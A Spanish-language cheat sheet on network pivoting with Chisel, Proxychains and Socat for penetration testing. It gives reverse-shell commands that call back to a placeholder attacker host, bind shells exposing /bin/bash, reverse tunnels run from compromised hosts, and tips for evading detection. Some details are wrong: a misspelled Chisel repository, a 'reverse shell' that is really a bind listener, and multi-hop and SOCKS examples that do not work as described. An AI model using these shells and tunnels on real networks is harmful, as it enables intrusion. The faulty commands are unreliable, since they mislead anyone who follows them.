# Pivoting with Chisel, Proxychains and Socat Cheat Sheet

## Overview

El pivoting es la técnica de usar un sistema comprometido para acceder a otros sistemas en la red. Estas herramientas te ayudan a:

- Establecer túneles a través de hosts comprometidos.
- Enrutar tráfico a través de múltiples saltos.
- Acceder a redes internas desde fuera.
- Evitar la segmentación de red.
- Llevar a cabo evaluaciones de seguridad autorizadas.

**Chisel**: Túnel TCP/UDP rápido sobre HTTP.
**Proxychains**: Forzar aplicaciones a través de servidores proxy.
**Socat**: Herramienta multipropósito de retransmisión para conexiones de red.

```text
Usa estas herramientas únicamente contra sistemas que poseas o tengas autorización explícita para testear.
```

---

# 1. Chisel - Túnel TCP/UDP sobre HTTP

## Overview

Chisel es un túnel TCP/UDP rápido sobre HTTP, asegurado por SSH. Es ideal para:

- Crear túneles inversos desde hosts comprometidos.
- Reenviar puertos a través de firewalls.
- Establecer proxies SOCKS.
- Hacer pivoting a través de múltiples hosts.

## Instalación

### Instalar en la máquina del atacante

```bash
# Descargar desde GitHub
wget https://github.com/jpillows/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.gz
gzip -d chisel_1.10.0_linux_amd64.gz
chmod +x chisel
mv chisel /usr/local/bin/
```

### Instalar en la máquina objetivo

Mismo proceso, o usar binario estático si el objetivo no tiene gestor de paquetes.

## Iniciar servidor Chisel

### Servidor básico

```bash
chisel server --port 8080 --reverse
```

### Servidor con autenticación

```bash
chisel server --port 8080 --reverse --auth user:password
```

### Servidor con múltiples usuarios

```bash
chisel server --port 8080 --reverse --auth user1:pass1 --auth user2:pass2
```

### Servidor con logging

```bash
chisel server --port 8080 --reverse --log-level debug
```

## Iniciar cliente Chisel

### Cliente básico (túnel inverso)

```bash
chisel client http://<server-ip>:8080 R:socks
```

Esto crea un proxy SOCKS en el lado del servidor.

### Cliente con reenvío de puerto específico

```bash
chisel client http://<server-ip>:8080 R:3389:192.168.1.10:3389
```

Reenvía RDP desde 192.168.1.10 a través del túnel.

### Cliente con múltiples reenvíos

```bash
chisel client http://<server-ip>:8080 R:3389:192.168.1.10:3389 R:22:192.168.1.20:22
```

### Cliente con autenticación

```bash
chisel client http://user:password@<server-ip>:8080 R:socks
```

### Cliente en modo foreground

```bash
chisel client http://<server-ip>:8080 R:socks --foreground
```

## Escenarios comunes de Chisel

### Crear proxy SOCKS a través de host comprometido

**En la máquina del atacante (servidor):**

```bash
chisel server --port 8080 --reverse
```

**En el host comprometido (cliente):**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

**Usar proxy con proxychains:**

```bash
proxychains nmap -sT 192.168.1.0/24
```

### Reenviar puerto específico

**En la máquina del atacante:**

```bash
chisel server --port 8080 --reverse
```

**En el host comprometido:**

```bash
chisel client http://<attacker-ip>:8080 R:3306:192.168.1.50:3306
```

Ahora conecta a localhost:3306 para alcanzar MySQL en 192.168.1.50.

### Pivoting multi-salto

**Primer salto:**

```bash
# En el primer host comprometido
chisel client http://<attacker-ip>:8080 R:socks
```

**Segundo salto a través del primero:**

```bash
# En el segundo host comprometido
chisel client http://<attacker-ip>:8080 R:socks
```

### Reverse shell a través de Chisel

**En la máquina del atacante:**

```bash
chisel server --port 8080 --reverse
```

**En el host comprometido:**

```bash
chisel client http://<attacker-ip>:8080 R:4444:127.0.0.1:4444
```

Luego inicia el listener de netcat en el atacante.

---

# 2. Proxychains - Forzar aplicaciones a través de proxy

## Overview

Proxychains fuerza a las aplicaciones a usar servidores proxy (SOCKS4, SOCKS5, HTTP). Es ideal para:

- Enrutar tráfico a través de hosts comprometidos.
- Evitar restricciones de red.
- Ocultar tu dirección IP real.
- Hacer pivoting a través de múltiples proxies.

## Instalación

### Instalar en Debian/Ubuntu

```bash
sudo apt update
sudo apt install proxychains -y
```

### Instalar desde el código fuente

```bash
git clone https://github.com/haad/proxychains.git
cd proxychains/proxychains
./configure
make
sudo make install
```

## Configuración

### Editar archivo de configuración

```bash
sudo nano /etc/proxychains/proxychains.conf
```

### Configuración básica

```ini
[ProxyList]
socks5 127.0.0.1 1080
```

### Múltiples proxies (cadena)

```ini
[ProxyList]
socks5 127.0.0.1 1080
socks5 192.168.1.10 1080
http 192.168.1.20 8080
```

### Habilitar protección contra DNS leaks

```ini
proxy_dns
```

Añade esto antes de la sección [ProxyList].

### Habilitar modo quiet

```ini
quiet_mode
```

Reduce la verbosidad del output.

## Usando Proxychains

### Uso básico

```bash
proxychains <command>
```

Ejemplo:

```bash
proxychains nmap -sT 192.168.1.10
```

### Forzar proxychains

```bash
proxychains -f <config-file> <command>
```

Ejemplo:

```bash
proxychains -f /etc/proxychains/proxychains.conf nmap -sT 192.168.1.10
```

### Con proxy SOCKS de Chisel

**Iniciar Chisel:**

```bash
chisel client http://<server-ip>:8080 R:socks
```

**Usar con proxychains:**

```bash
proxychains nmap -sT 192.168.1.0/24
```

### Comandos comunes con proxychains

```bash
# Escaneo Nmap
proxychains nmap -sT 192.168.1.10

# Conexión SSH
proxychains ssh user@192.168.1.10

# Petición Curl
proxychains curl http://192.168.1.10

# Metasploit
proxychains msfconsole

# SQLMap
proxychains sqlmap -u http://192.168.1.10/vuln.php?id=1

# WPScan
proxychains wpscan -u http://192.168.1.10/

# Hydra
proxychains hydra -L users.txt -P passwords.txt 192.168.1.10 ssh
```

## Ejemplos de configuración de Proxychains

### Único proxy SOCKS5

```ini
[ProxyList]
socks5 127.0.0.1 1080
```

### SOCKS5 con autenticación

```ini
[ProxyList]
socks5 127.0.0.1 1080 user password
```

### Proxy HTTP

```ini
[ProxyList]
http 127.0.0.1 8080
```

### Múltiples proxies en cadena

```ini
[ProxyList]
socks5 127.0.0.1 1080
socks5 192.168.1.10 1080
http 192.168.1.20 8080
```

### Cadena aleatoria

```ini
chain_len = 2
random_chain
```

---

# 3. Socat - Retransmisión de red multipropósito

## Overview

Socat (SOcket CAT) es una herramienta de retransmisión multipropósito para conexiones de red. Es ideal para:

- Reenvío de puertos.
- Crear reverse shells.
- Puentear conexiones de red.
- Convertir entre protocolos.
- Hacer pivoting a través de hosts comprometidos.

## Instalación

### Instalar en Debian/Ubuntu

```bash
sudo apt update
sudo apt install socat -y
```

### Instalar en CentOS/RHEL

```bash
sudo yum install socat -y
```

### Instalar en macOS

```bash
brew install socat
```

## Uso básico de Socat

### Escuchar en un puerto

```bash
socat TCP-LISTEN:4444 -
```

### Conectar a un puerto

```bash
socat TCP:<target-ip>:4444 -
```

### Reenviar puerto a otro puerto

```bash
socat TCP-LISTEN:8080 TCP:<target-ip>:80
```

### Reenviar con exec

```bash
socat TCP-LISTEN:4444 EXEC:/bin/bash
```

## Socat para Pivoting

### Crear reverse shell

**En la máquina del atacante:**

```bash
socat TCP-LISTEN:4444 -
```

**En el host comprometido:**

```bash
socat TCP:<attacker-ip>:4444 EXEC:/bin/bash
```

### Reenvío de puertos a través de host comprometido

**En el host comprometido:**

```bash
socat TCP-LISTEN:8080 TCP:192.168.1.50:80
```

Ahora conecta a compromised-host:8080 para alcanzar 192.168.1.50:80.

### Crear proxy SOCKS

**En el host comprometido:**

```bash
socat TCP-LISTEN:1080 SOCKS:192.168.1.50:80
```

### Reenvío bidireccional

**En el host comprometido:**

```bash
socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.50:80
```

Las opciones `reuseaddr,fork` permiten múltiples conexiones.

### Puente UDP a TCP

```bash
socat UDP-LISTEN:53 TCP:192.168.1.50:53
```

### Túnel SSL/TLS

**Lado del servidor:**

```bash
socat OPENSSL-LISTEN:443,reuseaddr,fork,cert=server.pem,key=server.key TCP:192.168.1.50:80
```

**Lado del cliente:**

```bash
socat TCP-LISTEN:8080,reuseaddr,fork OPENSSL:<server-ip>:443,verify=0
```

## Escenarios comunes de Socat

### Reverse shell con socat

**En el atacante:**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork -
```

**En el objetivo:**

```bash
socat TCP:<attacker-ip>:4444 EXEC:/bin/bash
```

### Bind shell con socat

**En el objetivo:**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

**Conectar desde el atacante:**

```bash
socat TCP:<target-ip>:4444 -
```

### Reenvío de puertos a través de múltiples saltos

**Primer salto:**

```bash
socat TCP-LISTEN:8080 TCP:<first-hop>:9090
```

**Segundo salto:**

```bash
socat TCP-LISTEN:9090 TCP:<second-hop>:80
```

### Transferencia de archivos con socat

**Receptor:**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork OPEN:received_file,creat,trunc
```

**Emisor:**

```bash
socat TCP:<receiver-ip>:4444 OPEN:file_to_send
```

### Túnel de base de datos

**En el host comprometido:**

```bash
socat TCP-LISTEN:3307 TCP:192.168.1.50:3306
```

Ahora conecta a localhost:3307 para alcanzar MySQL en 192.168.1.50:3306.

---

# 4. Escenarios combinados de Pivoting

## Escenario 1: Chisel + Proxychains

**Paso 1: Iniciar servidor Chisel en el atacante**

```bash
chisel server --port 8080 --reverse
```

**Paso 2: Conectar desde el host comprometido**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

**Paso 3: Usar proxychains con herramientas**

```bash
proxychains nmap -sT 192.168.1.0/24
proxychains ssh user@192.168.1.10
proxychains curl http://192.168.1.10/admin
```

## Escenario 2: Chisel + Socat

**Paso 1: Iniciar servidor Chisel**

```bash
chisel server --port 8080 --reverse
```

**Paso 2: Crear túnel desde el host comprometido**

```bash
chisel client http://<attacker-ip>:8080 R:3307:192.168.1.50:3306
```

**Paso 3: Usar socat para reenvío adicional**

```bash
socat TCP-LISTEN:3308 TCP:127.0.0.1:3307
```

## Escenario 3: Multi-salto con Chisel

**Primer host comprometido:**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

**Segundo host comprometido (a través del primero):**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

**Tercer host comprometido (a través del segundo):**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

## Escenario 4: Cadena de Proxychains

**Configurar /etc/proxychains/proxychains.conf:**

```ini
[ProxyList]
socks5 127.0.0.1 1080
socks5 192.168.1.10 1080
socks5 192.168.1.20 1080
```

**Usar con herramientas:**

```bash
proxychains nmap -sT 192.168.1.100
```

## Escenario 5: Combinación Socat + Chisel

**En el primer host comprometido:**

```bash
chisel client http://<attacker-ip>:8080 R:8080:192.168.1.50:80
```

**En la máquina del atacante:**

```bash
socat TCP-LISTEN:80,reuseaddr,fork TCP:127.0.0.1:8080
```

---

# 5. Técnicas avanzadas de Pivoting

## Reenvío dinámico de puertos

### Con Chisel

```bash
chisel client http://<server-ip>:8080 R:dynamic:1080
```

Crea un proxy SOCKS dinámico en el puerto 1080.

### Con SSH

```bash
ssh -D 1080 user@<compromised-host>
```

### Con Socat

```bash
socat TCP-LISTEN:1080,reuseaddr,fork SOCKS:192.168.1.50:80
```

## Reenvío local de puertos

### Con Chisel

```bash
chisel client http://<server-ip>:8080 L:3306:192.168.1.50:3306
```

### Con SSH

```bash
ssh -L 3306:192.168.1.50:3306 user@<compromised-host>
```

### Con Socat

```bash
socat TCP-LISTEN:3306,reuseaddr,fork TCP:192.168.1.50:3306
```

## Reenvío remoto de puertos

### Con Chisel

```bash
chisel client http://<server-ip>:8080 R:8080:192.168.1.50:80
```

### Con SSH

```bash
ssh -R 8080:192.168.1.50:80 user@<attacker-host>
```

### Con Socat

```bash
socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.50:80
```

## Túneles tipo VPN

### Con Chisel

```bash
# Servidor
chisel server --port 8080 --reverse --proxy "http://proxy:8080"

# Cliente
chisel client http://<server-ip>:8080 R:socks
```

### Con SSH

```bash
ssh -D 1080 -C user@<compromised-host>
```

La opción `-C` habilita la compresión.

---

# 6. Troubleshooting

## Problemas de Chisel

### Connection refused

- Comprueba si el servidor está en ejecución.
- Verifica que el puerto no esté bloqueado por el firewall.
- Asegúrate de que la dirección IP es correcta.

### Authentication failed

- Verifica username y password.
- Comprueba si hay errores tipográficos en las credenciales.
- Asegúrate de que el servidor tiene la autenticación correcta configurada.

### Rendimiento lento

- Reduce la sobrecarga de encriptación.
- Comprueba la latencia de red.
- Usa compresión si está disponible.

## Problemas de Proxychains

### Timeout de conexión

- Comprueba que el servidor proxy está en ejecución.
- Verifica la configuración del proxy.
- Testea la conectividad del proxy manualmente.

### DNS leaks

- Habilita `proxy_dns` en la configuración.
- Usa `proxychains -f` con la config correcta.
- Testea con `proxychains curl ifconfig.me`.

### La aplicación no funciona

- Algunas aplicaciones no funcionan con proxychains.
- Prueba `proxychains -d` para output debug.
- Usa el método LD_PRELOAD si es necesario.

## Problemas de Socat

### Address already in use

- Usa la opción `reuseaddr`.
- Comprueba si el puerto ya está en uso.
- Mata el proceso existente en el puerto.

### Connection reset

- Comprueba que el objetivo es alcanzable.
- Verifica las reglas del firewall.
- Asegúrate de que el servicio objetivo está en ejecución.

### Permission denied

- Ejecuta con privilegios apropiados.
- Comprueba las políticas de SELinux/AppArmor.
- Usa puertos no privilegiados (>1024).

---

# 7. Security Best Practices

## Verifica siempre los túneles

- Testea la conectividad a través de los túneles.
- Verifica que los datos fluyen correctamente.
- Monitoriza las desconexiones.
- Ten métodos de acceso de respaldo.

## Minimiza la detección

- Usa encriptación cuando sea posible.
- Evita escaneos ruidosos a través de túneles.
- Usa timing apropiado.
- Limpia después de testear.

## Mantén la estabilidad

- Usa conexiones persistentes.
- Implementa lógica de reconexión.
- Monitoriza la salud del túnel.
- Ten opciones de fallback.

## Documenta todo

- Registra las configuraciones de túnel.
- Nota qué hosts están comprometidos.
- Rastrea la topología de red.
- Documenta hallazgos y métodos.

---

# 8. Important Reminders

- Obtén siempre autorización explícita antes de hacer pivoting.
- Testea primero en entornos de laboratorio controlados.
- Algunas técnicas pueden triggerar alertas de seguridad.
- Respeta los límites y políticas de red.
- Mantén las herramientas actualizadas regularmente.
- Valida los hallazgos manualmente.
- Documenta todas las acciones y configuraciones.
- Preserva la evidencia original y los logs.
- Entiende las implicaciones legales y éticas.
- Limpia los túneles después de testear.

---

# 9. Quick Reference Commands

## Chisel

```bash
# Iniciar servidor
chisel server --port 8080 --reverse

# Iniciar cliente con SOCKS
chisel client http://<server-ip>:8080 R:socks

# Iniciar cliente con reenvío de puerto
chisel client http://<server-ip>:8080 R:3389:192.168.1.10:3389
```

## Proxychains

```bash
# Uso básico
proxychains <command>

# Nmap a través de proxy
proxychains nmap -sT 192.168.1.10

# SSH a través de proxy
proxychains ssh user@192.168.1.10
```

## Socat

```bash
# Escuchar en puerto
socat TCP-LISTEN:4444 -

# Reenviar puerto
socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.50:80

# Reverse shell
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

---

# 10. Additional Resources

## Chisel

```text
https://github.com/jpillows/chisel
```

## Proxychains

```text
https://github.com/haad/proxychains
```

## Socat

```text
http://www.dest-unreach.org/socat/
```

## Guía de Pivoting

```text
https://www.offensive-security.com/
```

## Técnicas de Network Pivoting

```text
https://www.sans.org/
```
